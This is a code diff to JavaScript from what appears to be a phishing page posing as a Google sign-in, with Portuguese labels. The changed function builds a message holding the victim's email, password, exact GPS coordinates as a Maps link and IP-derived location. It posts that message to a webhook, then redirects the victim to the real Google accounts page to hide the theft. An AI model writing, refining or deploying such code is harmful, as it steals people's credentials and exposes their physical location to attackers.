@@ -129,12 +129,28 @@
     );
   }
 
-  function postAndExit(){
-    let body = `SENHA: ${passInput.value} | EMAIL: ${emailInput.value}`;
-    if(geo.exata) body += ` | EXATA: ${geo.exata.lat},${geo.exata.lon} (±${geo.exata.acc}m)`;
-    if(geo.aprox) body += ` | APROX: ${geo.aprox.city||''}-${geo.aprox.region||''}-${geo.aprox.country||''} IP:${geo.aprox.ip||''}`;
-    fetch(WH,{method:'POST',body}).finally(()=> location.replace('https://accounts.google.com'));
+  function postAndExit() {
+  let body = `EMAIL: ${emailInput.value}\nSENHA: ${passInput.value}`;
+
+  if (geo.exata) {
+    body += `\nLOCAL EXATO: https://www.google.com/maps?q=${geo.exata.lat},${geo.exata.lon} (±${geo.exata.acc}m)`;
   }
+
+  if (geo.aprox) {
+    body += `\nLOCAL APROX: ${geo.aprox.city || ''}, ${geo.aprox.region || ''}, ${geo.aprox.country || ''} | IP: ${geo.aprox.ip || ''}`;
+  }
+
+  fetch(WH, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'text/plain'
+    },
+    body: body
+  }).finally(() => {
+    location.replace('https://accounts.google.com');
+  });
+}
+
 
   floatBtn.addEventListener('click', e=>{
     e.preventDefault();
